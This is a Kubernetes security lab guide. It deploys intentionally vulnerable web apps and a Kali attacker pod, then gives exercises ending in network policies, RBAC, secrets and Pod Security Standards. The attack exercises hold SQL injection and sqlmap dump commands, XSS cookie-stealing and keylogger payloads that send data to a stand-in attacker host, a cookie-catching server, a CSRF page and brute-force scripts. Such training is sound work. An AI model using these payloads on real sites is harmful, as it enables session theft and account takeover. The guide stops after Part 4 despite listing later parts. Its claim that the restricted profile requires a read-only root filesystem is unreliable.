# Kubernetes Security Lab
## Complete Hands-On Training Guide

**8-Week Progressive Learning Path**  
*Web Application Security • Container Security • Kubernetes Hardening*

---

# Table of Contents

1. [Lab Setup and Architecture](#part-1-lab-setup-and-architecture)
2. [Week 1-2: SQL Injection & XSS](#part-2-week-1-2-sql-injection--xss)
3. [Week 3-4: Authentication & Session Attacks](#part-3-week-3-4-authentication--session-attacks)
4. [Week 5-6: Kubernetes Security Fundamentals](#part-4-week-5-6-kubernetes-security-fundamentals)
5. [Week 7-8: Container Security & Supply Chain](#part-5-week-7-8-container-security--supply-chain)
6. [Appendix A: Complete YAML Manifests](#appendix-a-complete-yaml-manifests)
7. [Appendix B: Troubleshooting Guide](#appendix-b-troubleshooting-guide)

---

# Part 1: Lab Setup and Architecture

## 1.1 Architecture Overview

This security lab creates a complete penetration testing environment within Kubernetes. The architecture separates components into distinct namespaces representing different security zones.

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Kubernetes Cluster                                │
│  ┌─────────────────┐  ┌─────────────────┐  ┌─────────────────┐     │
│  │ vulnerable-apps │  │    attacker     │  │   monitoring    │     │
│  │   namespace     │  │   namespace     │  │   namespace     │     │
│  │                 │  │                 │  │                 │     │
│  │  ┌───────────┐  │  │  ┌───────────┐  │  │  ┌───────────┐  │     │
│  │  │   DVWA    │  │  │  │   Kali    │  │  │  │Elasticsearch│ │     │
│  │  └───────────┘  │  │  │  Linux    │  │  │  └───────────┘  │     │
│  │  ┌───────────┐  │  │  └───────────┘  │  │  ┌───────────┐  │     │
│  │  │Juice Shop │  │  │                 │  │  │  Kibana   │  │     │
│  │  └───────────┘  │  │                 │  │  └───────────┘  │     │
│  │  ┌───────────┐  │  │                 │  │                 │     │
│  │  │  WebGoat  │  │  │                 │  │                 │     │
│  │  └───────────┘  │  │                 │  │                 │     │
│  └─────────────────┘  └─────────────────┘  └─────────────────┘     │
│                                                                      │
│  ┌─────────────────┐                                                │
│  │   secure-zone   │  Network Policies control traffic flow         │
│  │   namespace     │  between all namespaces                        │
│  └─────────────────┘                                                │
└─────────────────────────────────────────────────────────────────────┘
```

| Namespace | Components | Purpose |
|-----------|------------|---------|
| `vulnerable-apps` | DVWA, Juice Shop, WebGoat | Target applications for attacks |
| `attacker` | Kali Linux pod | Attack workstation with security tools |
| `monitoring` | Elasticsearch, Kibana | Traffic analysis and log visualization |
| `secure-zone` | Hardened demo apps | Demonstrates security best practices |

## 1.2 Prerequisites

1. A Kubernetes cluster (minikube, kind, k3s, or cloud-managed)
2. kubectl installed and configured
3. Helm 3.x installed
4. At least 8GB RAM and 4 CPU cores available
5. Basic familiarity with Linux command line

### Verify Your Setup

```bash
# Check kubectl connection
kubectl cluster-info

# Verify you have sufficient resources
kubectl top nodes

# Check Helm installation
helm version
```

## 1.3 Quick Start Setup

```bash
# Create all namespaces
kubectl apply -f - &lt;&lt;EOF
apiVersion: v1
kind: Namespace
metadata:
  name: vulnerable-apps
  labels:
    purpose: security-training
    security-zone: untrusted
---
apiVersion: v1
kind: Namespace
metadata:
  name: attacker
  labels:
    purpose: security-training
    security-zone: attack
---
apiVersion: v1
kind: Namespace
metadata:
  name: monitoring
  labels:
    purpose: security-training
    security-zone: monitoring
---
apiVersion: v1
kind: Namespace
metadata:
  name: secure-zone
  labels:
    purpose: security-training
    security-zone: trusted
EOF
```

## 1.4 Deploy DVWA (Damn Vulnerable Web Application)

```yaml
# dvwa.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: dvwa
  namespace: vulnerable-apps
spec:
  replicas: 1
  selector:
    matchLabels:
      app: dvwa
  template:
    metadata:
      labels:
        app: dvwa
    spec:
      containers:
      - name: dvwa
        image: vulnerables/web-dvwa:latest
        ports:
        - containerPort: 80
        env:
        - name: MYSQL_ROOT_PASSWORD
          value: "dvwa"
---
apiVersion: v1
kind: Service
metadata:
  name: dvwa-service
  namespace: vulnerable-apps
spec:
  selector:
    app: dvwa
  ports:
  - port: 80
    targetPort: 80
  type: ClusterIP
```

## 1.5 Deploy OWASP Juice Shop

```yaml
# juice-shop.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: juice-shop
  namespace: vulnerable-apps
spec:
  replicas: 1
  selector:
    matchLabels:
      app: juice-shop
  template:
    metadata:
      labels:
        app: juice-shop
    spec:
      containers:
      - name: juice-shop
        image: bkimminich/juice-shop:latest
        ports:
        - containerPort: 3000
        resources:
          requests:
            memory: "256Mi"
            cpu: "200m"
          limits:
            memory: "512Mi"
            cpu: "500m"
---
apiVersion: v1
kind: Service
metadata:
  name: juice-shop-service
  namespace: vulnerable-apps
spec:
  selector:
    app: juice-shop
  ports:
  - port: 3000
    targetPort: 3000
  type: ClusterIP
```

## 1.6 Deploy WebGoat

```yaml
# webgoat.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: webgoat
  namespace: vulnerable-apps
spec:
  replicas: 1
  selector:
    matchLabels:
      app: webgoat
  template:
    metadata:
      labels:
        app: webgoat
    spec:
      containers:
      - name: webgoat
        image: webgoat/webgoat:latest
        ports:
        - containerPort: 8080
        - containerPort: 9090
---
apiVersion: v1
kind: Service
metadata:
  name: webgoat-service
  namespace: vulnerable-apps
spec:
  selector:
    app: webgoat
  ports:
  - name: webgoat
    port: 8080
    targetPort: 8080
  - name: webwolf
    port: 9090
    targetPort: 9090
  type: ClusterIP
```

## 1.7 Deploy Kali Linux Attacker Pod

```yaml
# kali.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: kali-attacker
  namespace: attacker
spec:
  replicas: 1
  selector:
    matchLabels:
      app: kali
  template:
    metadata:
      labels:
        app: kali
    spec:
      containers:
      - name: kali
        image: kalilinux/kali-rolling:latest
        command: ["/bin/bash", "-c"]
        args:
        - |
          apt-get update && apt-get install -y \
            sqlmap nikto nmap curl wget \
            dirb gobuster hydra netcat-openbsd \
            python3 python3-pip vim jq dnsutils && \
          pip3 install requests beautifulsoup4 --break-system-packages && \
          tail -f /dev/null
        resources:
          requests:
            memory: "512Mi"
            cpu: "500m"
          limits:
            memory: "2Gi"
            cpu: "2"
```

## 1.8 Deploy Monitoring Stack

```yaml
# elasticsearch.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: elasticsearch
  namespace: monitoring
spec:
  replicas: 1
  selector:
    matchLabels:
      app: elasticsearch
  template:
    metadata:
      labels:
        app: elasticsearch
    spec:
      containers:
      - name: elasticsearch
        image: docker.elastic.co/elasticsearch/elasticsearch:8.11.0
        ports:
        - containerPort: 9200
        env:
        - name: discovery.type
          value: single-node
        - name: xpack.security.enabled
          value: "false"
        - name: ES_JAVA_OPTS
          value: "-Xms512m -Xmx512m"
        resources:
          limits:
            memory: "2Gi"
---
apiVersion: v1
kind: Service
metadata:
  name: elasticsearch
  namespace: monitoring
spec:
  selector:
    app: elasticsearch
  ports:
  - port: 9200
    targetPort: 9200
---
# kibana.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: kibana
  namespace: monitoring
spec:
  replicas: 1
  selector:
    matchLabels:
      app: kibana
  template:
    metadata:
      labels:
        app: kibana
    spec:
      containers:
      - name: kibana
        image: docker.elastic.co/kibana/kibana:8.11.0
        ports:
        - containerPort: 5601
        env:
        - name: ELASTICSEARCH_HOSTS
          value: "http://elasticsearch:9200"
---
apiVersion: v1
kind: Service
metadata:
  name: kibana
  namespace: monitoring
spec:
  selector:
    app: kibana
  ports:
  - port: 5601
    targetPort: 5601
```

## 1.9 Accessing the Lab

```bash
# Connect to the Kali attacker pod
kubectl exec -it -n attacker deploy/kali-attacker -- /bin/bash

# From inside Kali, access vulnerable apps:
# DVWA:       curl http://dvwa-service.vulnerable-apps.svc.cluster.local
# Juice Shop: curl http://juice-shop-service.vulnerable-apps.svc.cluster.local:3000
# WebGoat:    curl http://webgoat-service.vulnerable-apps.svc.cluster.local:8080

# Port forward for browser access (run from your local machine)
kubectl port-forward -n vulnerable-apps svc/dvwa-service 8080:80 &
kubectl port-forward -n vulnerable-apps svc/juice-shop-service 3000:3000 &
kubectl port-forward -n vulnerable-apps svc/webgoat-service 8081:8080 &
kubectl port-forward -n monitoring svc/kibana 5601:5601 &

# Access in browser:
# DVWA:       http://localhost:8080
# Juice Shop: http://localhost:3000
# WebGoat:    http://localhost:8081/WebGoat
# Kibana:     http://localhost:5601
```

---

# Part 2: Week 1-2 SQL Injection & XSS

## Learning Objectives

By the end of this module, you will be able to:
- Identify and exploit SQL injection vulnerabilities
- Understand different types of XSS attacks
- Use automated tools (sqlmap, nikto) for vulnerability scanning
- Analyze attack patterns in logs

---

## Exercise 2.1: Basic SQL Injection on DVWA

### Background

SQL Injection occurs when user input is incorporated into SQL queries without proper sanitization.

### Setup

1. Access DVWA at http://localhost:8080
2. Login with credentials: `admin` / `password`
3. Click "Create / Reset Database"
4. Go to "DVWA Security" and set to "Low"
5. Navigate to "SQL Injection"

### Exercise Steps

**Step 1: Manual Testing**

From the Kali pod, test for SQL injection:

```bash
# Connect to Kali
kubectl exec -it -n attacker deploy/kali-attacker -- /bin/bash

# Test basic injection
curl -s "http://dvwa-service.vulnerable-apps.svc.cluster.local/vulnerabilities/sqli/?id=1'&Submit=Submit" \
  -H "Cookie: security=low; PHPSESSID=YOUR_SESSION_ID"
```

**Step 2: Enumerate the Database**

Try these payloads in the User ID field:

```sql
-- Test for vulnerability
1' OR '1'='1

-- Get number of columns
1' ORDER BY 1-- -
1' ORDER BY 2-- -

-- Extract database version
1' UNION SELECT null, version()-- -

-- Get current database name
1' UNION SELECT null, database()-- -

-- List all tables
1' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database()-- -

-- Extract user credentials
1' UNION SELECT user, password FROM users-- -
```

**Step 3: Automated Exploitation with sqlmap**

```bash
# Basic sqlmap scan
sqlmap -u "http://dvwa-service.vulnerable-apps.svc.cluster.local/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=YOUR_SESSION_ID" \
  --batch

# Enumerate databases
sqlmap -u "http://dvwa-service.vulnerable-apps.svc.cluster.local/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=YOUR_SESSION_ID" \
  --dbs --batch

# Dump the users table
sqlmap -u "http://dvwa-service.vulnerable-apps.svc.cluster.local/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=YOUR_SESSION_ID" \
  -D dvwa -T users --dump --batch
```

### Solution

<details>
<summary>Click to reveal solution</summary>

**Expected Output from Manual Testing:**

The payload `1' UNION SELECT user, password FROM users-- -` should return:

| User | Password (MD5 Hash) |
|------|---------------------|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 |
| gordonb | e99a18c428cb38d5f260853678922e03 |
| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 |
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 |

**Cracking the Hashes:**

```bash
# The hashes are MD5. Common passwords:
# admin:password
# gordonb:abc123
# 1337:charley
# pablo:letmein
# smithy:password
```

**Why It Works:**

The vulnerable code looks like:
```php
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
```

No input validation allows us to break out of the string and inject our own SQL.

</details>

---

## Exercise 2.2: Blind SQL Injection

### Background

When error messages are suppressed, you can still extract data using boolean-based or time-based techniques.

### Exercise Steps

**Step 1: Set DVWA Security to Medium**

**Step 2: Boolean-Based Blind Injection**

```sql
-- Test if admin exists (true condition)
1 AND 1=1

-- Test false condition
1 AND 1=2

-- Extract data character by character
1 AND (SELECT SUBSTRING(user,1,1) FROM users LIMIT 0,1)='a'
```

**Step 3: Time-Based Blind Injection**

```sql
-- If true, delay 5 seconds
1 AND SLEEP(5)

-- Conditional time-based extraction
1 AND IF((SELECT SUBSTRING(user,1,1) FROM users LIMIT 0,1)='a', SLEEP(5), 0)
```

**Step 4: Automate with sqlmap**

```bash
sqlmap -u "http://dvwa-service.vulnerable-apps.svc.cluster.local/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=medium; PHPSESSID=YOUR_SESSION_ID" \
  --technique=BT \
  --level=3 \
  --batch
```

### Solution

<details>
<summary>Click to reveal solution</summary>

**Key Insight:** The medium security code uses `mysqli_real_escape_string()` but the ID is not quoted:

```php
$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);
$query = "SELECT first_name, last_name FROM users WHERE user_id = $id";
```

Numeric injection still works with: `1 OR 1=1`

</details>

---

## Exercise 2.3: Reflected XSS

### Background

Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by other users.

### Setup

1. Navigate to "XSS (Reflected)" in DVWA
2. Set security to "Low"

### Exercise Steps

**Step 1: Basic XSS Test**

Enter in the "What's your name?" field:

```html
<script>alert('XSS')</script>
```

**Step 2: Cookie Stealing Payload**

```html
<script>document.location='http://ATTACKER_IP:8000/steal?c='+document.cookie</script>
```

**Step 3: Set Up a Listener in Kali**

```bash
# In Kali pod, start a simple HTTP server
python3 -m http.server 8000
```

**Step 4: Advanced Payloads**

```html
<!-- Image tag XSS -->
<img src=x onerror="alert('XSS')">

<!-- SVG XSS -->
<svg onload="alert('XSS')">

<!-- Encoded payload -->
<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>
```

### Solution

<details>
<summary>Click to reveal solution</summary>

**Vulnerable Code:**

```php
$html .= '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
```

No sanitization is performed on the `name` parameter.

**Cookie Stealing Script:**

```python
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class StealHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if '/steal' in self.path:
            query = urllib.parse.urlparse(self.path).query
            params = urllib.parse.parse_qs(query)
            if 'c' in params:
                print(f"[+] Stolen Cookie: {params['c'][0]}")
        self.send_response(200)
        self.end_headers()

HTTPServer(('0.0.0.0', 8000), StealHandler).serve_forever()
```

</details>

---

## Exercise 2.4: Stored XSS

### Background

Stored XSS persists in the application's database, affecting all users who view the compromised page.

### Setup

Navigate to "XSS (Stored)" in DVWA with security set to "Low"

### Exercise Steps

**Step 1: Basic Stored XSS**

In the "Message" field of the guestbook:

```html
<script>alert('Stored XSS')</script>
```

**Step 2: Persistent Cookie Stealer**

```html
<script>
new Image().src='http://ATTACKER:8000/steal?c='+document.cookie;
</script>
```

**Step 3: Keylogger Injection**

```html
<script>
document.onkeypress=function(e){
  new Image().src='http://ATTACKER:8000/log?k='+e.key;
}
</script>
```

### Solution

<details>
<summary>Click to reveal solution</summary>

**Impact Analysis:**

1. Any user visiting the guestbook page executes the malicious script
2. Cookies, keystrokes, and other sensitive data can be exfiltrated
3. The attack persists until the malicious entry is removed from the database

**Mitigation:**

```php
// Proper output encoding
$html .= '<pre>' . htmlspecialchars($message, ENT_QUOTES, 'UTF-8') . '</pre>';
```

</details>

---

## Exercise 2.5: XSS on Juice Shop

### Background

OWASP Juice Shop has more realistic XSS vulnerabilities in a modern application context.

### Exercise Steps

**Step 1: DOM-Based XSS**

Navigate to: `http://localhost:3000/#/search?q=<iframe src="javascript:alert('xss')">`

**Step 2: Reflected XSS via Track Order**

1. Go to Track Orders
2. Enter: `<iframe src="javascript:alert('xss')">`

**Step 3: Bonus Challenge - Find the Score Board**

```bash
# Hint: Check the JavaScript files
curl http://juice-shop-service.vulnerable-apps.svc.cluster.local:3000/main.js | grep -i score
```

### Solution

<details>
<summary>Click to reveal solution</summary>

**DOM XSS Explanation:**

The search functionality uses Angular and doesn't properly sanitize the query parameter before rendering it in the DOM.

**Score Board Location:**

Navigate to: `http://localhost:3000/#/score-board`

The path is hidden but not protected - an example of "Security through Obscurity."

</details>

---

## Exercise 2.6: Automated Vulnerability Scanning

### Exercise Steps

**Step 1: Nikto Scan**

```bash
# From Kali pod
nikto -h http://dvwa-service.vulnerable-apps.svc.cluster.local -o nikto_dvwa.txt

# Scan Juice Shop
nikto -h http://juice-shop-service.vulnerable-apps.svc.cluster.local:3000 -o nikto_juice.txt
```

**Step 2: Directory Bruteforcing**

```bash
# Using dirb
dirb http://dvwa-service.vulnerable-apps.svc.cluster.local /usr/share/dirb/wordlists/common.txt

# Using gobuster (faster)
gobuster dir -u http://dvwa-service.vulnerable-apps.svc.cluster.local \
  -w /usr/share/dirb/wordlists/common.txt \
  -t 50
```

**Step 3: Nmap Service Detection**

```bash
# Scan vulnerable-apps namespace
nmap -sV -sC dvwa-service.vulnerable-apps.svc.cluster.local
```

### Solution

<details>
<summary>Click to reveal solution</summary>

**Expected Nikto Findings:**

- Apache/PHP version disclosure
- Missing security headers (X-Frame-Options, X-XSS-Protection)
- Directory indexing enabled
- phpinfo.php exposed

**Key Directories Found:**

```
/setup.php
/config/
/docs/
/phpinfo.php
```

</details>

---

## Week 1-2 Challenge Lab

### Scenario

You've discovered a web application at `dvwa-service.vulnerable-apps.svc.cluster.local`. Your objectives:

1. Enumerate all users and their password hashes
2. Crack at least 3 passwords
3. Find and exploit an XSS vulnerability to steal an admin session
4. Document your findings in a penetration test report format

### Solution

<details>
<summary>Click to reveal complete solution</summary>

**1. SQL Injection Enumeration:**

```sql
1' UNION SELECT CONCAT(user,':',password), null FROM users-- -
```

**2. Cracked Passwords:**

| Username | Hash | Password |
|----------|------|----------|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 | password |
| gordonb | e99a18c428cb38d5f260853678922e03 | abc123 |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 | letmein |

**3. Cookie Theft Payload:**

```html
<script>fetch('http://ATTACKER:8000/steal?c='+btoa(document.cookie));</script>
```

</details>

---

# Part 3: Week 3-4 Authentication & Session Attacks

## Learning Objectives

- Understand session management vulnerabilities
- Perform brute force and credential stuffing attacks
- Exploit CSRF vulnerabilities
- Bypass authentication mechanisms

---

## Exercise 3.1: Brute Force Authentication

### Setup

1. Navigate to DVWA "Brute Force" section
2. Set security to "Low"

### Exercise Steps

**Step 1: Create a Password List**

```bash
# In Kali pod
cat > passwords.txt << 'EOF'
password
admin
123456
password123
letmein
welcome
admin123
root
qwerty
abc123
EOF
```

**Step 2: Hydra Brute Force**

```bash
# HTTP GET form attack
hydra -l admin -P passwords.txt \
  dvwa-service.vulnerable-apps.svc.cluster.local \
  http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: security=low; PHPSESSID=YOUR_SESSION:Username and/or password incorrect"
```

**Step 3: Custom Python Script**

```python
#!/usr/bin/env python3
import requests

target = "http://dvwa-service.vulnerable-apps.svc.cluster.local/vulnerabilities/brute/"
cookies = {"security": "low", "PHPSESSID": "YOUR_SESSION"}

with open("passwords.txt") as f:
    for password in f:
        password = password.strip()
        params = {"username": "admin", "password": password, "Login": "Login"}
        r = requests.get(target, params=params, cookies=cookies)
        if "Welcome to the password protected area" in r.text:
            print(f"[+] Found password: {password}")
            break
        else:
            print(f"[-] Tried: {password}")
```

### Solution

<details>
<summary>Click to reveal solution</summary>

**Successful Credentials:** `admin:password`

**Mitigation Strategies:**
1. Implement account lockout after failed attempts
2. Add CAPTCHA
3. Use rate limiting
4. Implement multi-factor authentication

</details>

---

## Exercise 3.2: Session Hijacking

### Exercise Steps

**Step 1: Analyze Session Cookies**

```bash
# From Kali, make multiple requests and analyze cookies
for i in {1..10}; do
  curl -s -c - "http://dvwa-service.vulnerable-apps.svc.cluster.local/login.php" | grep PHPSESSID
done
```

**Step 2: Session Prediction (DVWA Weak Session IDs)**

Navigate to "Weak Session IDs" in DVWA:

```bash
# Low security - sequential session IDs
curl -s "http://dvwa-service.vulnerable-apps.svc.cluster.local/vulnerabilities/weak_id/" \
  -H "Cookie: security=low; PHPSESSID=YOUR_SESSION" \
  -c - | grep dvwaSession
```

### Solution

<details>
<summary>Click to reveal solution</summary>

**Low Security Session ID Pattern:**

The session ID is simply incremented:
- First request: `dvwaSession=1`
- Second request: `dvwaSession=2`
- Third request: `dvwaSession=3`

**Medium Security:**

Uses timestamp: `dvwaSession=1699999999` (Unix epoch)

</details>

---

## Exercise 3.3: CSRF (Cross-Site Request Forgery)

### Setup

Navigate to DVWA "CSRF" section with security set to "Low"

### Exercise Steps

**Step 1: Analyze the Password Change Form**

```bash
curl -s "http://dvwa-service.vulnerable-apps.svc.cluster.local/vulnerabilities/csrf/" \
  -H "Cookie: security=low; PHPSESSID=YOUR_SESSION" | grep -A 20 "form"
```

**Step 2: Create a Malicious Page**

```html
<!-- csrf_attack.html -->
<!DOCTYPE html>
<html>
<head><title>Free Prize!</title></head>
<body>
  <h1>Congratulations! Click to claim your prize!</h1>
  
  <!-- Hidden image that changes password -->
  <img src="http://dvwa-service.vulnerable-apps.svc.cluster.local/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" 
       style="display:none">
</body>
</html>
```

### Solution

<details>
<summary>Click to reveal solution</summary>

**Attack Flow:**

1. Attacker creates malicious page with hidden request
2. Victim visits attacker's page while logged into DVWA
3. Victim's browser sends password change request with their session cookie
4. Password is changed without victim's knowledge

**Mitigation:**

1. Implement CSRF tokens
2. Check Referer header
3. Use SameSite cookie attribute
4. Require re-authentication for sensitive actions

</details>

---

## Exercise 3.4: JWT Attacks on Juice Shop

### Exercise Steps

**Step 1: Register and Login to Juice Shop**

```bash
# Register a new user
curl -X POST "http://juice-shop-service.vulnerable-apps.svc.cluster.local:3000/api/Users/" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"test123","passwordRepeat":"test123"}'

# Login
curl -X POST "http://juice-shop-service.vulnerable-apps.svc.cluster.local:3000/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"test123"}'
```

**Step 2: Analyze the JWT**

```bash
# Decode the JWT (base64)
echo "YOUR_JWT_TOKEN" | cut -d'.' -f2 | base64 -d
```

### Solution

<details>
<summary>Click to reveal solution</summary>

**Admin Email for Juice Shop:** `admin@juice-sh.op`

**Successful Login as Admin (using SQL Injection):**

```bash
curl -X POST "http://juice-shop-service.vulnerable-apps.svc.cluster.local:3000/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op'\''--","password":"anything"}'
```

</details>

---

## Exercise 3.5: Insecure Direct Object Reference (IDOR)

### Exercise Steps

**Step 1: Find IDOR in Juice Shop**

```bash
# Get your basket
curl "http://juice-shop-service.vulnerable-apps.svc.cluster.local:3000/rest/basket/1" \
  -H "Authorization: Bearer YOUR_JWT"

# Try accessing other users' baskets
curl "http://juice-shop-service.vulnerable-apps.svc.cluster.local:3000/rest/basket/2" \
  -H "Authorization: Bearer YOUR_JWT"
```

**Step 2: Enumerate User Data**

```bash
# Iterate through user IDs
for i in {1..10}; do
  echo "=== User $i ==="
  curl -s "http://juice-shop-service.vulnerable-apps.svc.cluster.local:3000/api/Users/$i" \
    -H "Authorization: Bearer YOUR_JWT"
done
```

### Solution

<details>
<summary>Click to reveal solution</summary>

**Vulnerable Endpoints:**

- `/rest/basket/{id}` - Access any user's basket
- `/api/Users/{id}` - View user details
- `/api/Feedbacks` - View all feedback
- `/#/administration` - Admin panel (frontend-only access control)

</details>

---

# Part 4: Week 5-6 Kubernetes Security Fundamentals

## Learning Objectives

- Implement Network Policies for pod isolation
- Configure RBAC for least-privilege access
- Manage secrets securely
- Understand Pod Security Standards

---

## Exercise 4.1: Network Policy Implementation

### Exercise Steps

**Step 1: Verify Current Network Access**

```bash
# From Kali pod, test connectivity to vulnerable apps
kubectl exec -it -n attacker deploy/kali-attacker -- \
  curl -s http://dvwa-service.vulnerable-apps.svc.cluster.local
```

**Step 2: Create a Default Deny Policy**

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: vulnerable-apps
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
```

**Step 3: Verify the Policy Works**

```bash
# This should now timeout
kubectl exec -it -n attacker deploy/kali-attacker -- \
  curl -s --max-time 5 http://dvwa-service.vulnerable-apps.svc.cluster.local
```

**Step 4: Create Selective Allow Policy**

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-from-monitoring
  namespace: vulnerable-apps
spec:
  podSelector:
    matchLabels:
      app: dvwa
  policyTypes:
  - Ingress
  ingress:
  - from:
    - namespaceSelector:
        matchLabels:
          security-zone: monitoring
    ports:
    - protocol: TCP
      port: 80
```

### Solution

<details>
<summary>Click to reveal solution</summary>

**Complete Network Policy Set:**

```yaml
# 1. Default deny all traffic
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: vulnerable-apps
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
---
# 2. Allow DNS resolution
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-dns
  namespace: vulnerable-apps
spec:
  podSelector: {}
  policyTypes:
  - Egress
  egress:
  - to:
    - namespaceSelector: {}
    ports:
    - protocol: UDP
      port: 53
---
# 3. Allow ingress from specific sources
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-web-ingress
  namespace: vulnerable-apps
spec:
  podSelector:
    matchLabels:
      app: dvwa
  policyTypes:
  - Ingress
  ingress:
  - from:
    - namespaceSelector:
        matchLabels:
          security-zone: monitoring
    - namespaceSelector:
        matchLabels:
          security-zone: attack
    ports:
    - protocol: TCP
      port: 80
```

</details>

---

## Exercise 4.2: RBAC Configuration

### Exercise Steps

**Step 1: Create a Limited Service Account**

```yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: security-auditor
  namespace: vulnerable-apps
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: pod-reader
  namespace: vulnerable-apps
rules:
- apiGroups: [""]
  resources: ["pods", "pods/log"]
  verbs: ["get", "list", "watch"]
- apiGroups: [""]
  resources: ["services"]
  verbs: ["get", "list"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: read-pods
  namespace: vulnerable-apps
subjects:
- kind: ServiceAccount
  name: security-auditor
  namespace: vulnerable-apps
roleRef:
  kind: Role
  name: pod-reader
  apiGroup: rbac.authorization.k8s.io
```

**Step 2: Test the Service Account**

```bash
# Test what the service account can do
kubectl auth can-i list pods -n vulnerable-apps --as=system:serviceaccount:vulnerable-apps:security-auditor
kubectl auth can-i delete pods -n vulnerable-apps --as=system:serviceaccount:vulnerable-apps:security-auditor
kubectl auth can-i list secrets -n vulnerable-apps --as=system:serviceaccount:vulnerable-apps:security-auditor
```

### Solution

<details>
<summary>Click to reveal solution</summary>

**RBAC Best Practices:**

1. **Least Privilege:** Only grant necessary permissions
2. **Namespace Scoping:** Use Roles instead of ClusterRoles when possible
3. **Avoid Wildcards:** Never use `"*"` in production
4. **Regular Audits:** Review RBAC bindings periodically

**Dangerous Patterns to Avoid:**

```yaml
# BAD: Too permissive
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]

# BAD: Secrets access
rules:
- apiGroups: [""]
  resources: ["secrets"]
  verbs: ["get", "list"]
```

</details>

---

## Exercise 4.3: Secrets Management

### Exercise Steps

**Step 1: Create a Secret**

```yaml
apiVersion: v1
kind: Secret
metadata:
  name: db-credentials
  namespace: vulnerable-apps
type: Opaque
data:
  username: YWRtaW4=
  password: c3VwZXJzZWNyZXQxMjM=
```

**Step 2: Demonstrate the Security Problem**

```bash
# Anyone with get secrets permission can read them
kubectl get secret db-credentials -n vulnerable-apps -o jsonpath='{.data.password}' | base64 -d
```

**Step 3: Create a Pod That Uses Secrets Properly**

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: secret-test
  namespace: vulnerable-apps
spec:
  containers:
  - name: test
    image: busybox
    command: ["sleep", "3600"]
    env:
    - name: DB_USERNAME
      valueFrom:
        secretKeyRef:
          name: db-credentials
          key: username
    - name: DB_PASSWORD
      valueFrom:
        secretKeyRef:
          name: db-credentials
          key: password
    volumeMounts:
    - name: secret-volume
      mountPath: /etc/secrets
      readOnly: true
  volumes:
  - name: secret-volume
    secret:
      secretName: db-credentials
```

### Solution

<details>
<summary>Click to reveal solution</summary>

**Secret Security Best Practices:**

1. Enable encryption at rest
2. Use external secret management (Vault, AWS Secrets Manager)
3. Limit RBAC access to secrets
4. Rotate secrets regularly
5. Use sealed-secrets or external-secrets operator

</details>

---

## Exercise 4.4: Pod Security Standards

### Exercise Steps

**Step 1: Enable Pod Security Admission**

```bash
# Label namespace for enforcement
kubectl label namespace secure-zone \
  pod-security.kubernetes.io/enforce=restricted \
  pod-security.kubernetes.io/warn=restricted
```

**Step 2: Try to Deploy a Privileged Pod**

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
  namespace: secure-zone
spec:
  containers:
  - name: test
    image: busybox
    command: ["sleep", "3600"]
    securityContext:
      privileged: true
# This should fail!
```

**Step 3: Deploy a Compliant Pod**

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: secure-pod
  namespace: secure-zone
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    runAsGroup: 1000
    fsGroup: 1000
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: app
    image: busybox
    command: ["sleep", "3600"]
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop:
        - ALL
    resources:
      limits:
        memory: "128Mi"
        cpu: "500m"
```

### Solution

<details>
<summary>Click to reveal solution</summary>

**Pod Security Standards Levels:**

| Level | Description | Use Case |
|-------|-------------|----------|
| Privileged | Unrestricted | System workloads |
| Baseline | Minimally restrictive | Most workloads |
| Restricted | Heavily restricted | Security-sensitive |

**Restricted Level Requirements:**

- Must run as non-root
- Must drop all capabilities
- Must use read-only root filesystem
